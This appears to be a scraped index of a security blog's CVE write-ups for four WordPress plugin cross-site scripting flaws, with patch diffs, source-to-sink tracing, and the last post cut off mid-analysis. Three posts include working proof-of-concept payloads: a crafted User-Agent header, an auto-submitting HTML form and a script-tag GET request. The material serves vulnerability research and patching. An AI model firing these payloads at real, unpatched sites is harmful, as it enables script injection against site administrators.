vulnerability occurs in file includes/admin/templates/pages/devices/models.php{: .filepath} at line 31. In the vulnerable version, $item-\u003emodel is printed into HTML without any protection: \u003cspan title=\"\u003c?php echo \\WP_STATISTICS\\Admin_Template::unknownToNotSet($item-\u003emodel); ?\u003e\" class=\"wps-model-name\"\u003e \u003c?php echo self::isUnknown($item-\u003emodel) ? esc_html__('Unknown', 'wp-statistics') : $item-\u003emodel; ?\u003e \u003c/span\u003e In the patched version, $item-\u003emodel is protected by wrapping it with esc_attr() and esc_html(). \u003cspan title=\"\u003c?php echo esc_attr(\\WP_STATISTICS\\Admin_Template::unknownToNotSet($item-\u003emodel)); ?\u003e\" class=\"wps-model-name\"\u003e \u003c?php echo self::isUnknown($item-\u003emodel) ? esc_html__('Unknown', 'wp-statistics') : esc_html($item-\u003emodel); ?\u003e \u003c/span\u003e 👉 The patch adds output escaping for $item-\u003emodel, ensuring it is escaped before being printed to HTML. ","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable code \u003c?php use WP_STATISTICS\\Helper; ?\u003e \u003cdiv class=\"postbox-container wps-postbox-full\"\u003e \u003c?php if (!empty($data['visitors'])) : ?\u003e \u003cdiv class=\"o-table-wrapper\"\u003e \u003ctable width=\"100%\" class=\"o-table wps-new-table\"\u003e \u003cthead\u003e \u003c/thead\u003e \u003ctbody\u003e \u003c?php foreach ($data['visitors'] as $item) : ?\u003e \u003ctr\u003e \u003ctd class=\"wps-pd-l\"\u003e \u003cspan title=\"\u003c?php echo \\WP_STATISTICS\\Admin_Template::unknownToNotSet($item-\u003emodel); ?\u003e\" class=\"wps-model-name\"\u003e \u003c?php echo self::isUnknown($item-\u003emodel) ? esc_html__('Unknown', 'wp-statistics') : $item-\u003emodel; ?\u003e \u003c/span\u003e \u003c/td\u003e \u003c/tr\u003e \u003c?php endforeach; ?\u003e \u003c/tbody\u003e \u003c/table\u003e \u003c/div\u003e \u003c?php else : ?\u003e \u003cdiv class=\"o-wrap o-wrap--no-data wps-center\"\u003e \u003c?php esc_html_e('No recent data available.', 'wp-statistics'); ?\u003e \u003c/div\u003e \u003c?php endif; ?\u003e \u003c/div\u003e If $data is not empty it iterates over $data and displays statistical visitor data including model. If empty it prints No recent data available. public static function isUnknown($value) { if (empty($value) or $value == 'Unknown' or $value == __(\"Unknown\", 'wp-statistics')) { return true; } return false; } public static function unknownToNotSet($value) { if (self::isUnknown($value)) { return __('(not set)', 'wp-statistics'); } return $value; } unknownToNotSet() returns (not set) if $item-\u003emodel is empty, Unknown, or the translated Unknown. __(\"Unknown\", 'wp-statistics') looks up the translation of Unknown in the plugin’s .po/.mo files. 👉 There is no protection for $item-\u003emodel. $data is not initialized in this file so it’s certain that it is created elsewhere and models.php{: .filepath} uses it when included. We could search for models.php to find where it is called, but here it is included dynamically. Instead, I searched for the containing folder pages/devices. Diff — How templates are included dynamically 👉 models.php{: .filepath} is called dynamically in the render() function of the TabsView class: class TabsView extends BaseTabView { public function render() { $currentTab = $this-\u003egetCurrentTab(); $data = $this-\u003egetTabData(); $args = [ 'title' =\u003e esc_html__('Devices', 'wp-statistics'), 'pageName' =\u003e Menus::get_page_slug('devices'), 'paged' =\u003e Admin_Template::getCurrentPaged(), 'custom_get' =\u003e ['tab' =\u003e $currentTab], 'data' =\u003e $data, 'viewMoreUrlArgs' =\u003e ['type' =\u003e 'single-' . rtrim($currentTab, 's'), 'from' =\u003e Request::get('from'), 'to' =\u003e Request::get('to')], 'tabs' =\u003e [ [ 'link' =\u003e Menus::admin_url('devices', ['tab' =\u003e 'overview']), 'title' =\u003e esc_html__('Overview', 'wp-statistics'), ], [ 'link' =\u003e Menus::admin_url('devices', ['tab' =\u003e 'browsers']), 'title' =\u003e esc_html__('Browsers', 'wp-statistics'), ], [ 'link' =\u003e Menus::admin_url('devices', ['tab' =\u003e 'platforms']), 'title' =\u003e esc_html__('Operating Systems', 'wp-statistics'), ], [ 'link' =\u003e Menus::admin_url('devices', ['tab' =\u003e 'models']), 'title' =\u003e esc_html__('Device Models', 'wp-statistics'), ], [ 'link' =\u003e Menus::admin_url('devices', ['tab' =\u003e 'categories']), 'title' =\u003e esc_html__('Device Categories', 'wp-statistics'), ] ], ]; Admin_Template::get_template(['layout/header', 'layout/tabbed-page-header', \"pages/devices/$currentTab\", 'layout/postbox.hide', 'layout/footer'], $args); } } There is correlation between the values in $args and the Devices submenu. The tab value in args corresponds to the tab URL parameter =\u003e the scope of tracing is the Devices admin submenu. We need to determine $currentTab to know how render() calls models.php{: .filepath} and $data for possible payload injection. Variable $currentTab // $currentTab = $this-\u003egetCurrentTab(); protected function getCurrentTab() { return Request::get('tab', $this-\u003edefaultTab); } getCurrentTab() returns the value from Request::get() // $param='tab' public static function get($param, $default = false, $return = 'string') { if (empty($_REQUEST[$param])) return $default; $value = $_REQUEST[$param]; if ($return === 'string') { return sanitize_text_field($value); } if ($return === 'url') { return sanitize_url($value); } if ($return === 'number') { return intval($valu","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:3:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Sources \u0026 Sinks Source: User-Agent header (POST /wp-json/wp-statistics/v2/hit) — DeviceDetector parse → getModel(). Sink: includes/admin/templates/pages/devices/models.php — echo $item-\u003emodel (without esc_html() / esc_attr()) ","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:3:3","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#sources--sinks"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow Attacker sends a UA containing an XSS payload The model containing the payload is stored in the database Admin opens the models tab =\u003e payload executes ","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:3:4","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Send a request containing the XSS payload: POST /wp-json/wp-statistics/v2/hit HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Linux; Android 14; Goly \"onmouseover=alert()-\" Build) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36 wp_statistics_hit=1\u0026source_type=home\u0026source_id=0\u0026search_query=\u0026signature=787b07b8979cb982ec89a4f103a68081\u0026endpoint=hit\u0026referred=\u0026page_uri=Lw%3D%3D Admin visits the endpoint and hovers over the model containing the payload: http://localhost/wp-admin/admin.php?page=wps_devices_page\u0026tab=models The browser executes JavaScript when the admin visits. Use \" to close the title, creating alert() via the onmouseover event because it’s a \u003cspan\u003e and - is used to concatenate in JavaScript to avoid syntax errors. ","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:4:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-9816 vulnerability in WP Statistics \u003c= 14.15.4 allows Stored XSS via the model value parsed from the User-Agent header. The payload is stored in the DB and displayed in the admin Device Models page without proper escaping. The 14.15.5 patch adds esc_html()/esc_attr() to output. Key takeaways: Stored XSS is more dangerous than reflected XSS because it persists in the DB. Data from HTTP headers must also be treated as untrusted input. Always escape on output rather than relying solely on input sanitization. Update the plugin to the latest version to prevent exploitation. ","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References Cross-site scripting (XSS) cheat sheet - PortSwigger WordPress WP Statistics \u003c= 14.15.4 - CVE-2025-9816 ","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:6:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress All in One Time Clock Lite Plugin.","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/"},{"categories":["CVE Analysis"],"collections":null,"content":"Reflected Cross-Site Scripting (XSS) vulnerability in the All in One Time Clock Lite plugin for WordPress. The vulnerability originates from the nonce parameter in versions up to and including 2.0, due to insufficient input handling and lack of output escaping. An attacker (including unauthenticated) can inject arbitrary script snippets into the page; these scripts will execute when the victim performs the manipulated action (for example: clicking a link). CVE ID: CVE-2025-6832 Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 2.0 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Product: WordPress All in One Time Clock Lite Plugin ","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:0:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - All in One Time Clock Lite: v2.0 (vulnerable) and v2.0.1 (patched). Diff tool - Meld or any diff comparison tool to inspect and compare differences between the two versions. ","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:1:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:2:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff In the vulnerable version, the nonce parameter is taken directly from $_POST with no sanitization: $nonce = (isset($_POST[\"nonce\"])) ? $_POST[\"nonce\"] : null; In the patched version, the nonce parameter is processed with sanitize_text_field() before use, preventing injection of malicious code: $nonce = (isset($_POST[\"nonce\"])) ? sanitize_text_field($_POST[\"nonce\"]) : null; 👉 The patch adds an input filtering layer for the nonce variable, ensuring data received from the request will have dangerous characters removed before further processing. Code change comparison between vulnerable and patched versions ","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:2:1","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable code The vulnerability is located in the function aio_time_clock_lite_js() of the class AIO_Time_Clock_Lite_Actions in the file aio-time-clock-lite-actions.php{: .filepath} public function aio_time_clock_lite_js() { // other logic $nonce = (isset($_POST[\"nonce\"])) ? $_POST[\"nonce\"] : null; if (wp_verify_nonce($nonce, 'time-clock-nonce')) { // other logic } else { echo json_encode( [ \"response\" =\u003e \"failed\", \"message\" =\u003e esc_attr_x(\"Not authorized to perform this action\", 'aio-time-clock-lite'), \"nonce\" =\u003e $nonce, \"clock_action\" =\u003e $clock_action, ] ); } wp_reset_postdata(); die(); } {: file=“aio-time-clock-lite-actions.php”} The wp_verify_nonce() function compares the $nonce value sent from the client with a valid value previously generated by the server using wp_create_nonce(). \u003cinput type=\"hidden\" name=\"time-clock-nonce\" id=\"time-clock-nonce\" value=\"\u003c?php echo wp_create_nonce(\"time-clock-nonce\"); ?\u003e\"\u003e {: file=“aio-settings.php”} If $nonce is invalid =\u003e it goes to the else branch returning a JSON error that contains $nonce. Clicking 2 references shows that the function public function aio_time_clock_lite_js() is registered as a callback for action hooks: Callback registration for ajax hooks The function aio_time_clock_lite_js() is attached to two Ajax hooks (authenticated \u0026 unauthenticated) wp_ajax_aio_time_clock_lite_js (authenticated). wp_ajax_nopriv_aio_time_clock_lite_js (unauthenticated). =\u003e Focus ","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:2:2","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Sources \u0026 Sinks Source: The nonce parameter is taken directly from $_POST (unauthenticated request). Sink: The nonce value is reflected back in echo json_encode(...). ","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:2:3","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#sources--sinks"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow Send a POST request (unauthenticated) to /wp-admin/admin-ajax.php with params: action=aio_time_clock_lite_js\u0026nonce=nonce_value The callback aio_time_clock_lite_js() is invoked The nonce value is checked =\u003e invalid The nonce value is reflected into the response body via echo json_encode(...) ","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:2:4","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:3:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create a webpage containing a submit form: \u003cform action=\"http://localhost/wp-admin/admin-ajax.php\" method=\"post\"\u003e \u003cinput type=\"hidden\" name=\"action\" value=\"aio_time_clock_lite_js\"\u003e \u003cinput type=\"hidden\" name=\"nonce\" value=\"\u003csvg onload=alert()\u003e\"\u003e \u003c/form\u003e \u003cscript\u003edocument.forms[0].submit()\u003c/script\u003e Send the link to the page containing the form to a user with privileges. Observe the injected JavaScript executing. Result — PoC execution screenshot ","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:3:1","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-6832 vulnerability in All in One Time Clock Lite \u003c= 2.0 allows an unauthenticated attacker to exploit a Reflected XSS via the nonce parameter. The 2.0.1 patch added sanitize_text_field() to filter input, preventing malicious code from being reflected in the JSON response. Key takeaways: Always sanitize and escape data before returning it in responses. Endpoints exposed to nopriv (unauthenticated) requests should be carefully reviewed. Reflected XSS commonly occurs when input values are directly reflected into output (JSON/HTML). Updating the plugin promptly is the simplest way to reduce risk. ","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:4:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References Cross-site scripting (XSS) cheat sheet — PortSwigger WordPress All in One Time Clock Lite \u003c= 2.0 — CVE-2025-6832 ","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:5:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Download Manager Plugin.","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/"},{"categories":["CVE Analysis"],"collections":null,"content":"A vulnerability exists in the Download Manager plugin prior to version 3.3.24. Data retrieved from GET requests is printed directly into HTML attributes, leading to reflected XSS when a user with privileges accesses a URL crafted by an attacker. CVE ID: CVE-2025-10146 Product: WordPress Download Manager Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 3.3.23 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated ","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Download Manager: v3.3.23(vulnerable) and v3.3.24(fixed) diff tool: meld or any tool capable of comparing differences between two versions ","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff Use any diff tool to compare the vulnerable and patched versions. A significant difference appears in src/Admin/views/stats/history.php. Vulnerable code: \u003c?php if (!empty($user_ids)): ?\u003e \u003cdiv class=\"clear-filter\"\u003e \u003c?php $get_params_xu = $get_params; unset($get_params_xu['user_ids']); $reset_url = add_query_arg($get_params_xu, 'edit.php'); ?\u003e \u003ca href=\"\u003c?php echo $reset_url; ?\u003e\" class=\"clear-btn\" title=\"\u003c?php _e('Clear user filter', 'download-manager'); ?\u003e\"\u003e \u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e \u003c/a\u003e \u003c/div\u003e \u003c?php endif; ?\u003e The GET parameters are directly assigned to the \u003ca\u003e element’s href without any protection, creating a risk of reflected XSS. Patched code: \u003c?php if (!empty($user_ids)): ?\u003e \u003cdiv class=\"clear-filter\"\u003e \u003c?php $get_params_xu = $get_params; unset($get_params_xu['user_ids']); $get_params_xu = \\WPDM\\__\\__::sanitize_array($get_params_xu, 'safetxt'); $reset_url = add_query_arg($get_params_xu, 'edit.php'); ?\u003e \u003ca href=\"\u003c?php echo esc_url($reset_url); ?\u003e\" class=\"clear-btn\" title=\"\u003c?php _e('Clear user filter', 'download-manager'); ?\u003e\"\u003e \u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e \u003c/a\u003e \u003c/div\u003e \u003c?php endif; ?\u003e Patch Diff: sanitized GET parameters and escaped URL The patch sanitizes the GET parameters using sanitize_array and uses esc_url to escape the URL, making it safe. ","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How It Works We need to identify the real URL to inject GET parameters containing the XSS payload. src/Admin/views/stats/history.php contains PHP and HTML tags inside the views folder, indicating it is included somewhere in the plugin. Searching for history.php in the plugin directory: Search results for history.php 👉 No direct matches are found. It is likely included dynamically like {$file_name}.php. Using regex \\{.*\\}\\.php: Regex search for dynamic includes src/Admin/views/stats/history.php is included in src/Admin/views/stats.php. The actual URL to access is declared at the top of stats.php: $base_page_uri = \"edit.php?post_type=wpdmpro\u0026page=wpdm-stats\"; Similarly, stats.php is also included elsewhere, but it’s not necessary to trace further since the URL is identified. To verify, we set a breakpoint in src/Admin/views/stats/history.php, start debugging, and access the URL: edit.php?post_type=wpdmpro\u0026page=wpdm-stats Breakpoint debugging to observe GET params First, the plugin collects all GET parameters into $get_params. If $user_ids is not empty, a “Clear filter” button is created. To make the button functional, it must generate a URL without the user_ids parameter: $get_params_xu = $get_params; // copy all GET parameters unset($get_params_xu['user_ids']); // remove user_ids from array $reset_url = add_query_arg($get_params_xu, 'edit.php'); // generate new URL unset($get_params_xu['user_ids']) removes the filter. add_query_arg($get_params_xu, 'edit.php') generates the URL with remaining parameters. This URL is attached to the “Clear filter” button: \u003ca href=\"\u003c?php echo $reset_url; ?\u003e\" class=\"clear-btn\"\u003e...\u003c/a\u003e Result: Clicking the button reloads the page without the user_ids filter. ","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect XSS Send a GET request containing the XSS payload: GET /wp-admin/edit.php?post_type=wpdmpro\u0026page=wpdm-stats\u0026user_ids[0]=1\u0026payload=\"\u003e\u003c/a\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e HTTP/1.1 The \"\u003e\u003c/a\u003e closes the \u003ca\u003e tag, followed by a \u003cscript\u003e to trigger alert(). Reflected XSS triggered via GET parameter 👉 XSS succeeds. When a user with privileges accesses the attacker-provided URL, reflected XSS occurs, simulating an Unauthenticated attack scenario. ","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/#detect-xss"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability CVE-2025-10146 in WordPress Download Manager \u003c= 3.3.23 is a reflected XSS, occurring when GET request data is printed directly into an HTML attribute without sanitization or escaping. Privileged users accessing the attacker-crafted URL may be exploited. The patch in 3.3.24: Sanitizes GET parameters (sanitize_array) to remove dangerous characters. Escapes URL (esc_url) before rendering in HTML to prevent XSS. Key takeaways: Always sanitize and escape user input before rendering in HTML. Check user permissions before processing or displaying sensitive data. Low-privilege roles (like contributor) can become attack vectors if the plugin does not enforce proper protections. Updating plugins regularly is a simple and effective defense. ","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References Cross-site scripting (XSS) cheat sheet WordPress Download Manager Plugin \u003c= 3.3.24 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress ShopLentor Plugin.","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/"},{"categories":["CVE Analysis"],"collections":null,"content":"A vulnerability in the ShopLentor plugin prior to version 3.2.0 allows an attacker with contributor privileges to inject malicious code into a block’s CSS. This CSS is then loaded inline into the page and can lead to Stored XSS when previewed or rendered in a browser. CVE ID: CVE-2025-58990 Product: WordPress ShopLentor Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 3.2.0 CVSS severity: Low (6.5) Required Privilege: Contributor ","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. ShopLentor: v3.2.0 (vulnerable) and v3.2.1 (fixed) diff tool: meld or any tool capable of comparing the two versions to see differences Activated WooCommerce plugin: WooCommerce must be activated before installing the ShopLentor Plugin ","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff Use any diff tool to compare differences between the vulnerable and fixed versions. The notable difference is in the file woolentor-blocks/includes/classes/Manage_Styles.php. Vulnerable version: public function save_block_css( $request ){ $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); // No user permission check // No sanitization of CSS before saving update_post_meta( $post_id, '_woolentor_css', $params['block_css'] ); $wp_filesystem-\u003eput_contents( $dirname . $filename, $params['block_css'] ); } Fixed version: public function save_block_css( $request ){ $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); // Only admin or the post author are allowed $post = get_post( $post_id ); if ( ! $post || ( ! current_user_can('manage_options') \u0026\u0026 get_current_user_id() !== (int) $post-\u003epost_author ) ) { return ['success' =\u003e false, 'message' =\u003e __('No permission')]; } // Sanitize data before saving $block_css = $this-\u003esanitize_css_content( $params['block_css'] ); update_post_meta( $post_id, '_woolentor_css', $block_css ); $wp_filesystem-\u003eput_contents( $dirname . $filename, $block_css ); } The patch uses current_user_can('manage_options') to check for admin privileges: If the user is admin =\u003e the first part ! current_user_can('manage_options') = false =\u003e the whole \u0026\u0026 expression is false =\u003e passes. If the user is the author =\u003e the latter part get_current_user_id() !== (int) $post-\u003epost_author = false =\u003e the whole \u0026\u0026 expression is false =\u003e passes. Patch Diff ","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How It Works public function save_block_css( $request ){ try{ global $wp_filesystem; if ( ! $wp_filesystem || !function_exists('WP_Filesystem') ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); if ( $post_id == 'woolentor-widget' \u0026\u0026 $params['has_block'] ) { update_option( $post_id, $params['block_css'] ); return [ 'success' =\u003e true, 'message' =\u003e __('Widget CSS Saved.', 'woolentor') ]; } $filename = \"woolentor-css-{$post_id}.css\"; $upload_dir_url = wp_upload_dir(); $dirname = trailingslashit( $upload_dir_url['basedir'] ) . 'woolentor-addons/'; if ( $params['has_block'] ) { update_post_meta( $post_id, '_woolentor_active', 'yes' ); $all_block_css = $params['block_css']; WP_Filesystem( false, $upload_dir_url['basedir'], true ); if( ! $wp_filesystem-\u003eis_dir( $dirname ) ) { $wp_filesystem-\u003emkdir( $dirname ); } update_post_meta( $post_id, '_woolentor_css', $all_block_css ); if ( ! $wp_filesystem-\u003eput_contents( $dirname . $filename, $all_block_css ) ) { throw new \\Exception( __('You are not permitted to save CSS.', 'woolentor' ) ); } return [ 'success' =\u003e true, 'message' =\u003e__('WooLentor Blocks css file update.', 'woolentor' ) ]; } else { delete_post_meta( $post_id, '_woolentor_active' ); if ( file_exists( $dirname.$filename ) ) { wp_delete_file( $dirname.$filename ); } delete_post_meta( $post_id, '_woolentor_css' ); return [ 'success' =\u003e true, 'message' =\u003e __('WooLentor Blocks CSS Delete.', 'woolentor' ) ]; } } catch( \\Exception $e ){ return [ 'success' =\u003e false, 'message' =\u003e $e-\u003egetMessage() ]; } } The save_block_css() function in the Manage_Styles class is responsible for saving or deleting the block CSS. The application retrieves post_id and block_css from the request. Special case: if post_id == 'woolentor-widget' =\u003e the CSS is saved to wp_options. Normal post case: If there is a block (has_block = true): Mark the post as active (_woolentor_active). Save the CSS into the wp_postmeta table with meta_key = _woolentor_css. mysql\u003e select * from wp_postmeta where meta_key='_woolentor_css'; +---------+---------+----------------+------------+ | meta_id | post_id | meta_key | meta_value | +---------+---------+----------------+------------+ | 27 | 69 | _woolentor_css | body:{} | | 687 | 1416 | _woolentor_css | body:{} | +---------+---------+----------------+------------+ Write the CSS file into the uploads directory (woolentor-css-{post_id}.css). Write CSS If there is no block (has_block = false): Remove the active flag and CSS meta. Delete the CSS file if it exists. 👉 The likely attack scenario is a typical Stored XSS: a user with role contributor (who cannot publish) creates a post and injects an XSS payload into the block CSS. The payload is stored in the database or a file; a higher-privileged user previews the content before publishing, the payload is loaded/rendered in the browser and executes, causing XSS. To understand how the data is rendered, search the plugin for _woolentor_css. Since CSS is stored in wp_postmeta under the meta_key = _woolentor_css, the plugin will query this value and insert it directly into HTML. Search Meta Key generate_inline_css() fetches block CSS from wp_postmeta with meta_key = _woolentor_css and from the file woolentor-css-{$post_id}.css — if the file exists it calls get_contents and inlines the CSS for the post with the given $post_id; otherwise it falls back to wp_postmeta. The content is placed inside a \u003cstyle 